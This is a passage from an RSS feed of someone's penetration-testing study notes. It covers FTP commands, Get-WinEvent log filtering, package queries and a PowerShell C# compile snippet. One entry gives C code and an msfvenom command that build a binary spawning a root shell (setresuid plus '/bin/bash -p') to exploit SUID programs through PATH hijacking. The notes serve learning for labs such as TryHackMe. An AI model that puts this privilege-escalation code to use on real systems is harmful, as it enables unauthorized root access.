&lt;span id=&quot;cb8-14&quot;&gt;&lt;a href=&quot;#cb8-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;            P.Start();&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-15&quot;&gt;&lt;a href=&quot;#cb8-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-16&quot;&gt;&lt;a href=&quot;#cb8-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-17&quot;&gt;&lt;a href=&quot;#cb8-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-18&quot;&gt;&lt;a href=&quot;#cb8-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;vs&quot;&gt;&amp;quot;@&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-19&quot;&gt;&lt;a href=&quot;#cb8-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Add-Type&lt;/span&gt; -outputtype consoleapplication -outputassembly &lt;span class=&quot;va&quot;&gt;$BINARY_NAME&lt;/span&gt; -TypeDefinition &lt;span class=&quot;va&quot;&gt;$code&lt;/span&gt; -Language CSharp&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;additional-resources-4&quot;&gt;Additional Resources&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Mimikatz.md&quot;&gt;Using Mimikatz&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20PowerShell.md</guid>
		</item>
		<item>
			<title>File Transfer Protocol (FTP)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/File%20Transfer%20Protocol%20%28FTP%29.md</link>
			<description>&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;LIST - List contents of the supplied directory (or user's FTP root)&lt;/li&gt;&lt;li&gt;PASS - Specify the password for the account logging on&lt;/li&gt;&lt;li&gt;PASV - Switch to passive mode&lt;/li&gt;&lt;li&gt;QUIT - End the current session/connection&lt;/li&gt;&lt;li&gt;RETR - Retrieve the provided file&lt;/li&gt;&lt;li&gt;STAT - Provide connection/server information&lt;/li&gt;&lt;li&gt;SYST - Provide system &quot;type&quot; information&lt;/li&gt;&lt;li&gt;TYPE - Switch between ASCII (A) and binary (I) transfer modes&lt;/li&gt;&lt;li&gt;USER - Specify the username for the account logging on&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There are a lot more obscure commands as well, though the above is sufficient for basic operations.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot;&gt;FTP Commands: QUIT, USER, ABOR, ACCT, SYST, XDEL&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command&quot;&gt;FTP Commands: APPE, MLSD, MLST, LIST, RETR, STOR, STOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;file-retrieval&quot;&gt;File Retrieval&lt;/h2&gt;&lt;p&gt;Note that you cannot receive files using FTP with a &lt;em&gt;single&lt;/em&gt; telnet/netcat session, as file transfers are conducted over a separate channel (either a channel originating from port 20 on the server for &quot;active&quot; mode or a random port above 1023 on the client for &quot;passive&quot; mode).&lt;/p&gt;&lt;p&gt;However, you &lt;em&gt;can&lt;/em&gt; retrieve files using &lt;em&gt;two&lt;/em&gt; sessions.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Switch to passive mode (PASV).&lt;/li&gt;&lt;li&gt;The FTP server will reply with a string of the form (o1,o2,o3,o4,p1,p2), where o1 - o4 are the four octets of the server's IP address and p1 - p2 are the high + low bytes of the port number to connect to.&lt;/li&gt;&lt;li&gt;Use (256 Ã p1) + p2 to determine the decimal port number. For example, if p1 = 117 and p2 = 85, then then port number you need to connect to is 30037.&lt;/li&gt;&lt;li&gt;Connect a &lt;em&gt;second&lt;/em&gt; telnet/netcat client to the IP + port provided by the server.&lt;/li&gt;&lt;li&gt;Issue the appropriate file retrieval (RETR) command in the original telnet/netcat client. The file will be sent to the second client.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Which is a lot of work, but sometimes you just don't have an FTP client.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402&quot;&gt;How to list FTP directories using telnet?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;ftps&quot;&gt;FTPS&lt;/h2&gt;&lt;p&gt;FTPS (FTP over SSL) uses port 990 by default. Mostly supplanted by SFTP.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/File%20Transfer%20Protocol%20%28FTP%29.md</guid>
		</item>
		<item>
			<title>Force "more" Into Interactive Mode</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Force%20%22more%22%20Into%20Interactive%20Mode.md</link>
			<description>&lt;p&gt;The &lt;code&gt;more&lt;/code&gt; command acts like cat whenever it can. The only way to force &lt;code&gt;more&lt;/code&gt; into interactive mode is to make your terminal smaller than the number of lines in the file being displayed.&lt;/p&gt;&lt;p&gt;Incidentally, this means that it's impossible to send commands to when using it to display a one-line file.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Force%20%22more%22%20Into%20Interactive%20Mode.md</guid>
		</item>
		<item>
			<title>Get-WinEvent</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Get-WinEvent.md</link>
			<description>&lt;p&gt;Get-WinEvent is a PowerShell command for working with Windows event logs.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Get help on Get-WinEvent (calls out to Microsoft).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Get-Help&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;Get-WinEvent&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Filter event log output using the Where-Object command. This&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# apparently pipes the entire output to the Where-Object command, which&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# then scans for the appropriate field. So a bit inefficient for large&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# logs.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Get-WinEvent&lt;/span&gt; -LogName Application | &lt;span class=&quot;fu&quot;&gt;Where-Object&lt;/span&gt; {&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;ProviderName&lt;/span&gt; -Match &amp;#39;WLMS&amp;#39;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# To match event IDs with Where-Object, use the slightly different form&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# `Where-Object Id -eq  100`, etc.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Use the -FilterHashtable flag. This causes the filtering to be done&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# during the call made by Get-WinEvent, and has a more straight-forward&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# syntax too. However, it only works when called against the system&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-20&quot;&gt;&lt;a href=&quot;#cb1-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# event log; Where-Object needs to be used when specifying an archived&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-21&quot;&gt;&lt;a href=&quot;#cb1-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# log via -Path.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-22&quot;&gt;&lt;a href=&quot;#cb1-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-23&quot;&gt;&lt;a href=&quot;#cb1-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Note that hashes can be specified with newlines instead of semicolons&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-24&quot;&gt;&lt;a href=&quot;#cb1-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# as well, which can make scripts A LOT more readable!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-25&quot;&gt;&lt;a href=&quot;#cb1-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-26&quot;&gt;&lt;a href=&quot;#cb1-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Get-WinEvent&lt;/span&gt; -FilterHashtable @{&lt;/span&gt;
&lt;span id=&quot;cb1-27&quot;&gt;&lt;a href=&quot;#cb1-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    LogName = &amp;#39;Application&amp;#39;;&lt;/span&gt;
&lt;span id=&quot;cb1-28&quot;&gt;&lt;a href=&quot;#cb1-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    ProviderName = &amp;#39;WLMS&amp;#39;&lt;/span&gt;
&lt;span id=&quot;cb1-29&quot;&gt;&lt;a href=&quot;#cb1-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;
&lt;span id=&quot;cb1-30&quot;&gt;&lt;a href=&quot;#cb1-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-31&quot;&gt;&lt;a href=&quot;#cb1-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# To display all information about an event, pipe the output of&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-32&quot;&gt;&lt;a href=&quot;#cb1-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Get-WinEvent to `Format-List -Property *`&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/windowseventlogs&quot;&gt;TryHackMe: Windows Event Logs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/powershell/module/microsoft.powershell.diagnostics/get-winevent&quot;&gt;Get-WinEvent&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20PowerShell.md&quot;&gt;Using PowerShell&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Windows%20Event%20Logs.md&quot;&gt;Windows Event Logs&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;filterhashtable-keys&quot;&gt;FilterHashtable Keys&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;LogName (String)&lt;/li&gt;&lt;li&gt;ProviderName (String)&lt;/li&gt;&lt;li&gt;Path (String)&lt;/li&gt;&lt;li&gt;Keywords (Long)&lt;/li&gt;&lt;li&gt;ID (Int32)&lt;/li&gt;&lt;li&gt;Level (Int32)&lt;/li&gt;&lt;li&gt;StartTime (DateTime)&lt;/li&gt;&lt;li&gt;EndTime (DateTime)&lt;/li&gt;&lt;li&gt;UserID (SID)&lt;/li&gt;&lt;li&gt;Data (String)&lt;/li&gt;&lt;li&gt;[NamedData] (String)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Wildcards can be used with LogName and ProviderName, but not with other keys.&lt;/p&gt;&lt;p&gt;Event Viewer displays &lt;em&gt;most&lt;/em&gt; of these values in the &quot;General&quot; when viewing an individual log entry, though note that Keywords is translated to a string.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/powershell/scripting/samples/Creating-Get-WinEvent-queries-with-FilterHashtable&quot;&gt;Creating Get-WinEvent queries with FilterHashtable&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;keywords&quot;&gt;Keywords&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;AuditFailure (4503599627370496)&lt;/li&gt;&lt;li&gt;AuditSuccess (9007199254740992)&lt;/li&gt;&lt;li&gt;CorrelationHint2 (18014398509481984)&lt;/li&gt;&lt;li&gt;EventLogClassic (36028797018963968)&lt;/li&gt;&lt;li&gt;Sqm (2251799813685248)&lt;/li&gt;&lt;li&gt;WdiDiagnostic (1125899906842624)&lt;/li&gt;&lt;li&gt;WdiContext (562949953421312)&lt;/li&gt;&lt;li&gt;ResponseTime (281474976710656)&lt;/li&gt;&lt;li&gt;None (0)&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;levels&quot;&gt;Levels&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;Verbose (5)&lt;/li&gt;&lt;li&gt;Informational (4)&lt;/li&gt;&lt;li&gt;Warning (3)&lt;/li&gt;&lt;li&gt;Error (2)&lt;/li&gt;&lt;li&gt;Critical (1)&lt;/li&gt;&lt;li&gt;LogAlways (0)&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Get-WinEvent.md</guid>
		</item>
		<item>
			<title>How to Find Executables with SUID Capabilities</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Find%20Executables%20with%20SUID%20Capabilities.md</link>
			<description>&lt;p&gt;Executables can also have an SUID &quot;capability&quot; set in Linux, which is &lt;em&gt;not&lt;/em&gt; the same as the SUID permission!&lt;/p&gt;&lt;p&gt;The &lt;code&gt;getcap&lt;/code&gt; command displays a binary's capabilities (if there are any), and can even be used to perform a search for such binaries using &lt;code&gt;getcap -r $PATH 2&amp;gt; /dev/null&lt;/code&gt;.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Find%20Executables%20with%20SUID%20Capabilities.md</guid>
		</item>
		<item>
			<title>How to Load a Shell with a Simple Executable</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Load%20a%20Shell%20with%20a%20Simple%20Executable.md</link>
			<description>&lt;p&gt;It's actually trivial to write a C program that loads up a shell.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; main() {&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    setresuid(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    system(&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -p&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile with:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;gcc&lt;/span&gt; -fPIC -o /path/to/malicious /path/to/malicious.c&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that this is &lt;em&gt;almost&lt;/em&gt; identical to the LD_PRELOAD trick; the differences are:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;main()&lt;/code&gt; instead of &lt;code&gt;_init()&lt;/code&gt; as our entry point.&lt;/li&gt;&lt;li&gt;Compile without -shared and -nostartfiles.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;A simple binary like this is useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20LD_PRELOAD.md&quot;&gt;Exploiting LD_PRELOAD&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h2&gt;&lt;p&gt;The msfvenom tool can generate binaries with essentially the same functionality as above.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p linux/x86/exec CMD=&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -p&amp;quot;&lt;/span&gt; -f elf &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-o&lt;/span&gt; shell.elf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Load%20a%20Shell%20with%20a%20Simple%20Executable.md</guid>
		</item>
		<item>
			<title>How to Match Files to Packages</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Match%20Files%20to%20Packages.md</link>
			<description>&lt;h2 id=&quot;debian&quot;&gt;Debian&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List all installed packages&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dpkg-query&lt;/span&gt; -l&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List files in an installed package&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dpkg-query&lt;/span&gt; -L &lt;span class=&quot;va&quot;&gt;$PACKAGE_NAME&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List the package that owns a particular file&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dpkg-query&lt;/span&gt; -S &lt;span class=&quot;va&quot;&gt;$FULL_PATH_TO_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://linuxhint.com/list_installed_packages_debian/&quot;&gt;List All Installed Packages on Debian 11&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://askubuntu.com/questions/32507/how-do-i-get-a-list-of-installed-files-from-a-package&quot;&gt;How do I get a list of installed files from a package?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://superuser.com/questions/179353/how-do-i-find-out-which-package-owns-a-file&quot;&gt;How do I find out which package owns a file?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;red-hat&quot;&gt;Red Hat&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List all installed packages&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
